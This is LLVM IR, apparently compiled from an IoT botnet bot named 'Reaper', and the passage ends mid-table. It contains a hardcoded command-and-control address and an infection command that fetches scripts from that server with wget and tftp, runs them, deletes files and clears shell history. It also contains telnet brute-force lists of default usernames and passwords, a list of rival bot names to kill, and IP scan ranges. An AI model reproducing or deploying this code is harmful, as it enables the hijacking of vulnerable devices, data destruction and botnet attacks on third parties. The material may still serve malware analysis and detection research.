; ModuleID = 'host/ir_O1/Reaper.b.ll'
source_filename = "llvm-link"
target datalayout = "e-m:e-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.in_addr = type { i32 }
%struct.__va_list_tag = type { i32, i32, i8*, i8* }
%struct.__sigset_t = type { [16 x i64] }
%struct.timeval = type { i64, i64 }
%struct.telstate_t = type { i32, i32, i8, i8, i8, i8, i8, i32, i16, i8* }
%struct.sockaddr_in = type { i16, i16, %struct.in_addr, [8 x i8] }
%struct.sockaddr = type { i16, [14 x i8] }
%struct.iphdr = type { i8, i8, i16, i16, i16, i8, i8, i16, i32, i32 }
%struct.tcphdr = type { %union.anon.0 }
%union.anon.0 = type { %struct.anon }
%struct.anon = type { i16, i16, i32, i32, i8, i8, i16, i16, i16 }
%struct.hostent = type { i8*, i8**, i32, i32, i8** }
%struct.ifreq = type { %union.anon.5, %union.anon.6 }
%union.anon.5 = type { [16 x i8] }
%union.anon.6 = type { %struct.ifmap }
%struct.ifmap = type { i64, i64, i16, i8, i8, i8 }
%struct._IO_FILE = type { i32, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, %struct._IO_marker*, %struct._IO_FILE*, i32, i32, i64, i16, i8, [1 x i8], i8*, i64, i8*, i8*, i8*, i8*, i64, i32, [20 x i8] }
%struct._IO_marker = type { %struct._IO_marker*, %struct._IO_FILE*, i32 }

@knownBots = local_unnamed_addr global [86 x i8*] [i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.1, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.2, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.3, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.4, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.5, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.6, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.6, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.7, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.8, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.9, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.10, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.11, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.12, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.13, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.14, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.15, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.16, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.17, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.18, i32 0, i32 0), i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.19, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.21, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.22, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.23, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.24, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.25, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.26, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.27, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.28, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.29, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.30, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.1, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.31, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.32, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.33, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.34, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.35, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.36, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.37, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.38, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.39, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.40, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.41, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.42, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.43, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.44, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.45, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.46, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.47, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.48, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.49, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.50, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.51, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.52, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.53, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.54, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.55, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.56, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.57, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.58, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.59, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.60, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.61, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.62, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.63, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.64, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.65, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.66, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.67, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.68, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.69, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.70, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.71, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.72, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.73, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.74, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.75, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.76, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.77, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.78, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.79, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.80, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.81, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.82, i32 0, i32 0)], align 16
@.str = private unnamed_addr constant [5 x i8] c"mips\00", align 1
@.str.1 = private unnamed_addr constant [7 x i8] c"mipsel\00", align 1
@.str.2 = private unnamed_addr constant [4 x i8] c"sh4\00", align 1
@.str.3 = private unnamed_addr constant [4 x i8] c"x86\00", align 1
@.str.4 = private unnamed_addr constant [5 x i8] c"i686\00", align 1
@.str.5 = private unnamed_addr constant [4 x i8] c"ppc\00", align 1
@.str.6 = private unnamed_addr constant [5 x i8] c"i586\00", align 1
@.str.7 = private unnamed_addr constant [8 x i8] c"jackmy*\00", align 1
@.str.8 = private unnamed_addr constant [8 x i8] c"hackmy*\00", align 1
@.str.9 = private unnamed_addr constant [5 x i8] c"arm*\00", align 1
@.str.10 = private unnamed_addr constant [3 x i8] c"b1\00", align 1
@.str.11 = private unnamed_addr constant [3 x i8] c"b2\00", align 1
@.str.12 = private unnamed_addr constant [3 x i8] c"b3\00", align 1
@.str.13 = private unnamed_addr constant [3 x i8] c"b4\00", align 1
@.str.14 = private unnamed_addr constant [3 x i8] c"b5\00", align 1
@.str.15 = private unnamed_addr constant [3 x i8] c"b6\00", align 1
@.str.16 = private unnamed_addr constant [3 x i8] c"b7\00", align 1
@.str.17 = private unnamed_addr constant [3 x i8] c"b8\00", align 1
@.str.18 = private unnamed_addr constant [3 x i8] c"b9\00", align 1
@.str.19 = private unnamed_addr constant [17 x i8] c"busyboxterrorist\00", align 1
@.str.20 = private unnamed_addr constant [9 x i8] c"DFhxdhdf\00", align 1
@.str.21 = private unnamed_addr constant [10 x i8] c"dvrHelper\00", align 1
@.str.22 = private unnamed_addr constant [8 x i8] c"FDFDHFC\00", align 1
@.str.23 = private unnamed_addr constant [5 x i8] c"FEUB\00", align 1
@.str.24 = private unnamed_addr constant [9 x i8] c"FTUdftui\00", align 1
@.str.25 = private unnamed_addr constant [9 x i8] c"GHfjfgvj\00", align 1
@.str.26 = private unnamed_addr constant [6 x i8] c"jhUOH\00", align 1
@.str.27 = private unnamed_addr constant [9 x i8] c"JIPJIPJj\00", align 1
@.str.28 = private unnamed_addr constant [10 x i8] c"JIPJuipjh\00", align 1
@.str.29 = private unnamed_addr constant [10 x i8] c"kmyx86_64\00", align 1
@.str.30 = private unnamed_addr constant [10 x i8] c"lolmipsel\00", align 1
@.str.31 = private unnamed_addr constant [8 x i8] c"RYrydry\00", align 1
@.str.32 = private unnamed_addr constant [5 x i8] c"tel*\00", align 1
@.str.33 = private unnamed_addr constant [9 x i8] c"TwoFace*\00", align 1
@.str.34 = private unnamed_addr constant [9 x i8] c"UYyuyioy\00", align 1
@.str.35 = private unnamed_addr constant [5 x i8] c"wget\00", align 1
@.str.36 = private unnamed_addr constant [7 x i8] c"x86_64\00", align 1
@.str.37 = private unnamed_addr constant [9 x i8] c"XDzdfxzf\00", align 1
@.str.38 = private unnamed_addr constant [5 x i8] c"xxb*\00", align 1
@.str.39 = private unnamed_addr constant [3 x i8] c"sh\00", align 1
@.str.40 = private unnamed_addr constant [2 x i8] c"1\00", align 1
@.str.41 = private unnamed_addr constant [2 x i8] c"2\00", align 1
@.str.42 = private unnamed_addr constant [2 x i8] c"3\00", align 1
@.str.43 = private unnamed_addr constant [2 x i8] c"4\00", align 1
@.str.44 = private unnamed_addr constant [2 x i8] c"5\00", align 1
@.str.45 = private unnamed_addr constant [2 x i8] c"6\00", align 1
@.str.46 = private unnamed_addr constant [2 x i8] c"7\00", align 1
@.str.47 = private unnamed_addr constant [2 x i8] c"8\00", align 1
@.str.48 = private unnamed_addr constant [2 x i8] c"9\00", align 1
@.str.49 = private unnamed_addr constant [3 x i8] c"10\00", align 1
@.str.50 = private unnamed_addr constant [3 x i8] c"11\00", align 1
@.str.51 = private unnamed_addr constant [3 x i8] c"12\00", align 1
@.str.52 = private unnamed_addr constant [3 x i8] c"13\00", align 1
@.str.53 = private unnamed_addr constant [3 x i8] c"14\00", align 1
@.str.54 = private unnamed_addr constant [3 x i8] c"15\00", align 1
@.str.55 = private unnamed_addr constant [3 x i8] c"16\00", align 1
@.str.56 = private unnamed_addr constant [3 x i8] c"17\00", align 1
@.str.57 = private unnamed_addr constant [3 x i8] c"18\00", align 1
@.str.58 = private unnamed_addr constant [3 x i8] c"19\00", align 1
@.str.59 = private unnamed_addr constant [3 x i8] c"20\00", align 1
@.str.60 = private unnamed_addr constant [6 x i8] c"hackz\00", align 1
@.str.61 = private unnamed_addr constant [5 x i8] c"bin*\00", align 1
@.str.62 = private unnamed_addr constant [5 x i8] c"gtop\00", align 1
@.str.63 = private unnamed_addr constant [5 x i8] c"ftp*\00", align 1
@.str.64 = private unnamed_addr constant [6 x i8] c"tftp*\00", align 1
@.str.65 = private unnamed_addr constant [7 x i8] c"botnet\00", align 1
@.str.66 = private unnamed_addr constant [8 x i8] c"swatnet\00", align 1
@.str.67 = private unnamed_addr constant [8 x i8] c"ballpit\00", align 1
@.str.68 = private unnamed_addr constant [8 x i8] c"fucknet\00", align 1
@.str.69 = private unnamed_addr constant [9 x i8] c"cracknet\00", align 1
@.str.70 = private unnamed_addr constant [8 x i8] c"weednet\00", align 1
@.str.71 = private unnamed_addr constant [7 x i8] c"gaynet\00", align 1
@.str.72 = private unnamed_addr constant [9 x i8] c"queernet\00", align 1
@.str.73 = private unnamed_addr constant [8 x i8] c"ballnet\00", align 1
@.str.74 = private unnamed_addr constant [5 x i8] c"unet\00", align 1
@.str.75 = private unnamed_addr constant [7 x i8] c"yougay\00", align 1
@.str.76 = private unnamed_addr constant [7 x i8] c"sttftp\00", align 1
@.str.77 = private unnamed_addr constant [7 x i8] c"sstftp\00", align 1
@.str.78 = private unnamed_addr constant [7 x i8] c"sbtftp\00", align 1
@.str.79 = private unnamed_addr constant [6 x i8] c"btftp\00", align 1
@.str.80 = private unnamed_addr constant [9 x i8] c"y0u1sg3y\00", align 1
@.str.81 = private unnamed_addr constant [6 x i8] c"bruv*\00", align 1
@.str.82 = private unnamed_addr constant [5 x i8] c"IoT*\00", align 1
@PromServer = local_unnamed_addr global [1 x i8*] [i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.83, i32 0, i32 0)], align 8
@.str.83 = private unnamed_addr constant [16 x i8] c"46.101.35.30:23\00", align 1
@infect = local_unnamed_addr global i8* getelementptr inbounds ([341 x i8], [341 x i8]* @.str.84, i64 0, i64 0), align 8
@.str.84 = private unnamed_addr constant [341 x i8] c"cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://46.101.35.30/kittyhaxz.sh; chmod 777 kittyhaxz.sh; sh kittyhaxz.sh; ktftp 46.101.35.30 -c get ktftp1.sh; chmod 777 ktftp1.sh; sh ktftp1.sh; ktftp -r ktftp2.sh -g 46.101.35.30; chmod 777 ktftp2.sh; sh ktftp2.sh; rm -rf kittyhaxz.sh ktftp1.sh ktftp2.sh; rm -rf *;history -c\0D\0A\00", align 1
@mainCommSock = local_unnamed_addr global i32 0, align 4
@currentServer = local_unnamed_addr global i32 -1, align 4
@gotIP = local_unnamed_addr global i32 0, align 4
@numpids = local_unnamed_addr global i64 0, align 8
@macAddress = local_unnamed_addr global [6 x i8] zeroinitializer, align 1
@usernames = local_unnamed_addr global [20 x i8*] [i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.85, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.86, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.87, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.88, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.89, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.89, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.86, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.90, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.91, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.91, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.91, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.91, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.91, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.92, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.91, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.93, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.94, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.95, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.91, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.96, i32 0, i32 0)], align 16
@.str.85 = private unnamed_addr constant [8 x i8] c"telnet\00\00", align 1
@.str.86 = private unnamed_addr constant [7 x i8] c"admin\00\00", align 1
@.str.87 = private unnamed_addr constant [9 x i8] c"support\00\00", align 1
@.str.88 = private unnamed_addr constant [8 x i8] c"daemon\00\00", align 1
@.str.89 = private unnamed_addr constant [9 x i8] c"default\00\00", align 1
@.str.90 = private unnamed_addr constant [8 x i8] c"666666\00\00", align 1
@.str.91 = private unnamed_addr constant [6 x i8] c"root\00\00", align 1
@.str.92 = private unnamed_addr constant [12 x i8] c"supervisor\00\00", align 1
@.str.93 = private unnamed_addr constant [6 x i8] c"user\00\00", align 1
@.str.94 = private unnamed_addr constant [6 x i8] c"1111\00\00", align 1
@.str.95 = private unnamed_addr constant [9 x i8] c"service\00\00", align 1
@.str.96 = private unnamed_addr constant [6 x i8] c"test\00\00", align 1
@passwords = local_unnamed_addr global [20 x i8*] [i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.85, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.86, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.87, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.97, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.89, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.97, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.98, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.90, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.99, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.100, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.101, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.102, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.98, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.103, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.104, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.93, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.94, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.95, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.105, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.96, i32 0, i32 0)], align 16
@.str.97 = private unnamed_addr constant [2 x i8] zeroinitializer, align 1
@.str.98 = private unnamed_addr constant [10 x i8] c"password\00\00", align 1
@.str.99 = private unnamed_addr constant [6 x i8] c"anko\00\00", align 1
@.str.100 = private unnamed_addr constant [6 x i8] c"tini\00\00", align 1
@.str.101 = private unnamed_addr constant [8 x i8] c"Zte521\00\00", align 1
@.str.102 = private unnamed_addr constant [7 x i8] c"vizxv\00\00", align 1
@.str.103 = private unnamed_addr constant [10 x i8] c"zyad1234\00\00", align 1
@.str.104 = private unnamed_addr constant [10 x i8] c"1234qwer\00\00", align 1
@.str.105 = private unnamed_addr constant [12 x i8] c"oelinux123\00\00", align 1
@tmpdirs = local_unnamed_addr global [11 x i8*] [i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.106, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.107, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.108, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.109, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.110, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.111, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.112, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.113, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.114, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.115, i32 0, i32 0), i8* null], align 16
@.str.106 = private unnamed_addr constant [15 x i8] c"/dev/netslink/\00", align 1
@.str.107 = private unnamed_addr constant [6 x i8] c"/tmp/\00", align 1
@.str.108 = private unnamed_addr constant [6 x i8] c"/var/\00", align 1
@.str.109 = private unnamed_addr constant [6 x i8] c"/dev/\00", align 1
@.str.110 = private unnamed_addr constant [10 x i8] c"/var/run/\00", align 1
@.str.111 = private unnamed_addr constant [10 x i8] c"/dev/shm/\00", align 1
@.str.112 = private unnamed_addr constant [6 x i8] c"/mnt/\00", align 1
@.str.113 = private unnamed_addr constant [7 x i8] c"/boot/\00", align 1
@.str.114 = private unnamed_addr constant [6 x i8] c"/usr/\00", align 1
@.str.115 = private unnamed_addr constant [6 x i8] c"/opt/\00", align 1
@advances = global [5 x i8*] [i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.116, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.117, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.118, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.119, i32 0, i32 0), i8* null], align 16
@.str.116 = private unnamed_addr constant [2 x i8] c":\00", align 1
@.str.117 = private unnamed_addr constant [5 x i8] c"ogin\00", align 1
@.str.118 = private unnamed_addr constant [8 x i8] c"sername\00", align 1
@.str.119 = private unnamed_addr constant [8 x i8] c"assword\00", align 1
@fails = global [8 x i8*] [i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.120, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.121, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.122, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.123, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.124, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.125, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.126, i32 0, i32 0), i8* null], align 16
@.str.120 = private unnamed_addr constant [7 x i8] c"nvalid\00", align 1
@.str.121 = private unnamed_addr constant [6 x i8] c"ailed\00", align 1
@.str.122 = private unnamed_addr constant [9 x i8] c"ncorrect\00", align 1
@.str.123 = private unnamed_addr constant [6 x i8] c"enied\00", align 1
@.str.124 = private unnamed_addr constant [5 x i8] c"rror\00", align 1
@.str.125 = private unnamed_addr constant [7 x i8] c"oodbye\00", align 1
@.str.126 = private unnamed_addr constant [4 x i8] c"bad\00", align 1
@successes = global [4 x i8*] [i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.127, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.128, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.129, i32 0, i32 0), i8* null], align 16
@.str.127 = private unnamed_addr constant [8 x i8] c"busybox\00", align 1
@.str.128 = private unnamed_addr constant [2 x i8] c"$\00", align 1
@.str.129 = private unnamed_addr constant [2 x i8] c"#\00", align 1
@advances2 = global [11 x i8*] [i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.120, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.121, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.122, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.123, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.124, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.125, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.126, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.127, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.128, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.129, i32 0, i32 0), i8* null], align 16
@Nranges = local_unnamed_addr global [16 x i32] [i32 110, i32 111, i32 112, i32 113, i32 114, i32 115, i32 116, i32 117, i32 118, i32 119, i32 223, i32 1, i32 103, i32 203, i32 202, i32 122], align 16
@pids = common local_unnamed_addr global i32* null, align 8
@ourIP = common local_unnamed_addr global %struct.in_addr zeroinitializer, align 4
@scanPid = common local_unnamed_addr global i32 0, align 4
@ourPublicIP = common local_unnamed_addr global %struct.in_addr zeroinitializer, align 4
@Q = internal unnamed_addr global [4096 x i32] zeroinitializer, align 16
@rand_cmwc.i = internal unnamed_addr global i32 4095, align 4
@c = internal unnamed_addr global i32 362436, align 4
@.str.558 = private unnamed_addr constant [7 x i8] c"(null)\00", align 1
@fdopen_pids = internal unnamed_addr global i32* null, align 8
@.str.130 = private unnamed_addr constant [8 x i8] c"/bin/sh\00", align 1
@.str.131 = private unnamed_addr constant [3 x i8] c"-c\00", align 1
@hextable = internal unnamed_addr constant [256 x i64] [i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 0, i64 1, i64 2, i64 3, i64 4, i64 5, i64 6, i64 7, i64 8, i64 9, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 10, i64 11, i64 12, i64 13, i64 14, i64 15, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 10, i64 11, i64 12, i64 13, i64 14, i64 15, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 